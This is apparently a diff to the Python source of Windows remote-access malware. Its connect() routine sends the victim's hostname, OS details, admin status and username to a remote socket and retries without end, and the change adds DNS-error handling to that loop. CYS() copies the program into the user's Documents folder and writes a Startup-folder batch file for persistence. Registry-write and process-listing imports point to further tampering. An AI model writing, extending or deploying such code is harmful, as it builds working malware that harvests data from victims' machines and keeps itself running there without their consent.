@@ -17,7 +17,7 @@ from subprocess import getoutput,call
 from sys import exit,argv
 from os import chdir,environ,system as run
 from os.path import basename
-from socket import socket,AF_INET,SOCK_STREAM
+from socket import socket,AF_INET,SOCK_STREAM,gaierror
 from shutil import copyfile
 from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
 from psutil import process_iter,AccessDenied
@@ -52,6 +52,7 @@ def connect()->None:
         s.send(dumps({"node":node(),"release":release(),"machine":machine(),"processor":processor(),"admin":windll.shell32.IsUserAnAdmin(),"username":environ.get("username")}))
     except TimeoutError:connect()
     except ConnectionRefusedError:connect()
+    except gaierror:connect()
 def CYS()->None:
     copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ.get("username")))
     with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
